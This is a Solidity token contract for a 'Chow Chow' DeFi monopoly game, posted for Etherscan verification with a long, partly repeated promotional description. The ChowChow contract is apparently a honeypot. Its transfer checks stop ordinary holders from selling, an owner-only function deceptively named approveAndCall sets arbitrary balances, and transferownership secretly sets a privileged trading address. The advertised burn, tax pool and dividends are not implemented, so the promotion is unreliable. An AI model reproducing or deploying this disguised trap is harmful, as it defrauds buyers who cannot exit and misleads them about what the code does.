/**
 *Submitted for verification at Etherscan.io on 2021-05-30
*/

/*
Introducing Chow Chow, the first monopoly DeFi light game on Ethereum blockchain


Build your own house!

Use ETH and USDT to experience Chow Chow in the high-speed and fun of ETH. You’ve got a smarter and fun mining experience ready to enjoy!
What is Chow Chow?
Chow Chow is a monopoly game built on Ethereum blockchain (ETH). To participate in-game mining, players can spend ETH, USDT, USDT and other ETH tokens in the game to get a chance to roll the dice and build different types of buildings on different grids. In order to ensure the game has a good deflation and dividend model, once a house or shop is constructed and cannot pay taxes on time, it will be removed.
For more information, please refer to our whitepapaer.
Chow Chow Overview:
•  Owning different land properties and housing levels, corresponding to different mining output.
•  The total supply of CHOW is only 1 million, and on-chain transfer will permanently burn 5% of its transaction amount.
•  A tax pool is built in game for holding, which dividends USDT, ETH for holders.
•  As the circulation of tokens increases, the mining output speed/scale will be reduced accordingly.
•  The building constructed will be forced to be removed when failure to pay taxes on time.
•  50% of game revenue is used to buy back secondary tokens.
How does it work?
Land properties
In Chow Chow, there are 36 grids in each map, players can choose passing by or stay on the grid. 32 grids are buildable or upgradeable buildings when the player stays, and 4 grids can be triggered by random events (buildings cannot be built on random event grids).
Housing (Normal) land: 22 squares
Shop (Rare) land: 6 squares
Bank (Epic) Land: 3 grids
Government (Legendary) land: 1 grid
Random events: 4 grids
Construction mechanism
According to the grid properties of different buildable houses in the game, there are four types of buildings, and the mining speed and taxes of each house type are different.
Housing (Normal) land: general mining, less tax.
Shop (Rare) land: faster mining and higher taxes.
Bank (Epic) Land: Super fast mining and taxes are extremely high.
Government (Legendary) land: Mining is faster and taxes are less.
Tax Pool (Dividends)
The game will establish a tax pool system. All taxes paid by players will be included in the tax pool. The tokens in the tax pool will be reallocated according to the number of CHOW holding addresses. When a user holds more CHOW, the more tax dividends will be received in the pool.
For example, there are currently 100 USDT in the tax pool and 10,000 CHOW in circulation. If the player holds 1,000 CHOW, the player will receive 10 USDT.
Random Events Grid
There are 5 kinds of random events in total, and each event has a probability of 20%.
Random upgrade: houses will be randomly upgraded by 1 level;
Random downgrade: houses will be randomly downgraded by 1 level;
Designated remote upgrade: If the player designate a house, the player can pay ETH or CHOW to upgrade the house;
Lady Luck: Get a free roll;
God of Wealth: Give a certain amount of ETH or CHOW to the player.
Housing upgrade
House upgrade: If the player builds a house on this grid and stays on the grid again, the player can pay ETH, USDT, USDT to upgrade the house, the upper limit of upgrade is Lv2; if the player use CHOW to upgrade the house, the upper limit of upgrade is Lv3;
Game dice
There are three types of dice in Chow Chow.

 
Mining and output reduction
Constructive mining is the main way to obtain CHOW tokens through participation in the game, and the corresponding CHOW output can be obtained through house construction.
Who we are?
All the founding members of Chow Chow have worked in Tencent Interactive Entertainment (IEG), and have been involved in product planning and front-end operations in first-line online games.

 


Audit completed and official website is online, Chow Chow is moving to the next stop
The game will establish a tax pool system. All taxes paid by players will be included in the tax pool. The tokens in the tax pool will be reallocated according to the number of CHOW holding addresses. When a user holds more CHOW, the more tax dividends will be received in the pool.
For example, there are currently 100 USDC in the tax pool and 10,000 CHOW in circulation. If the player holds 1,000 CHOW, the player will receive 10 USDC.
2.5 Housing upgrade (Advanced Consumption)
House upgrade: If the player builds a house on this grid and stays on the grid again, the player can pay ETH, USDC, USDT to upgrade the house, the upper limit of upgrade is Lv2; if the player use CHOW to upgrade the house, the upper limit of upgrade is Lv3;
Paid remote upgrade: If the player stays on the random event grid after rolling the dice, there is a probability that the player will get a opportunity to upgrade the designated house remotely. The player needs to pay ETH, USDC, USDT or CHOW to proceed, respectively, the upper limit of upgrade is Lv2 and Lv3;
2.6 Map range
There will be 34 grids, of which 30 grids are buildable, and 4 grids can be triggered random events after a new ETH address authorizes contract to create the map;
Note: When the 30 grids on the map are full, the player can choose to upgrade after passing each construction plot;
2.7 Random events grid(Lottery)
There are 5 kinds of random events in total, and each event has a probability of 20%.
•  Random upgrade: houses that have been built will be randomly upgraded by 1 level;
•  Random downgrade: houses that have been built will be randomly downgraded by 1 level;
•  Designated remote upgrade: If the player designate a house, the player can pay ETH or CHOW to upgrade the house;
•  Lady Luck: Get a free roll;
•  God of Wealth: Give a certain amount of ETH or CHOW to the player.
3. Game dice
There are three types of dice in Chow Chow. Each type of dice can be obtained in three different ways.
3.1 Ordinary dice
Dice type  Introduction  Price
Ordinary dice  Ordinary dice, random number of steps  5 USDC
Lucky dice  With lucky dice, you can choose the range of steps  20 USDC
Golden dice  With golden dice, you can choose the number of steps   Private sale
3.2 USDC packages
Introduction  Quantity  Price  
Ordinary dice  Ordinary dice, random number of steps  10  48 USDC
Lucky dice  With lucky dice, you can choose the range of steps  10  180 USDC
3.3 CHOW packages (discount)
Dice type  Introduction  Quantity  Price
Ordinary dice  Ordinary dice, random number of steps  1  CHOW at 80% of original price
Lucky dice  With lucky dice, you can choose the range of steps  1  CHOW at 80% of original price
3.4 Random dice package
Type  Introduction  Quantity  Price
Normal Package  Mystery boxes, includes ordinary, lucky and golden dice randomly  10  70 USDC
Type  Probability
Ordinary dice  80%
Lucky dice  18%
Golden dice  2%
4. Mining and production reduction
Constructive mining is the main way to obtain CHOW tokens through participation in the game, and the corresponding CHOW output can be obtained through house construction.
4.1 Housing construction and upgrades
Housing type  Number  Lv0 construction  Lv1 upgrade  Lv2 upgrade  Lv3 upgrade
Housing (Normal)  20  10 USDC  20 USDC  40 USDC  80 USDC
Shop (Rare)  6  40 USDC  80 USDC  160 USDC  320 USDC
Bank (Epic)  3  80 USDC  160 USDC  320 USDC  640 USDC
Government (Legendary)  1  10 USDC  20 USDC  40 USDC  80 USDC
4.2 House tax
After the house is constructed, there will be a 72h countdown. Taxes should be paid before the countdown returns to 0, and the accumulated countdown time will be accumulated. Players can pay taxes multiple times to continuously increase the countdown accumulation to prevent the house from being removed due to tax arrears in a short period of time .
Housing type  Lv0 tax  Lv1 tax  Lv2 tax  Lv3 tax
Housing (Normal)  10 USDC  20 USDC  40 USDC  80 USDC
Shop (Rare)  40 USDC  80 USDC  160 USDC  320 USDC
Bank (Epic)  80 USDC  160 USDC  320 USDC  640 USDC
Government (Legendary)  10 USDC  20 USDC  40 USDC  80 USDC
*/

pragma solidity ^0.5.17;
interface IBEP20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeBEP20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IBEP20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IBEP20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IBEP20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IBEP20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeBEP20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeBEP20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeBEP20: BEP20 operation did not succeed");
        }
    }
}

contract BEP20 is Context, IBEP20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract BEP20Detailed is IBEP20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract ChowChow {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}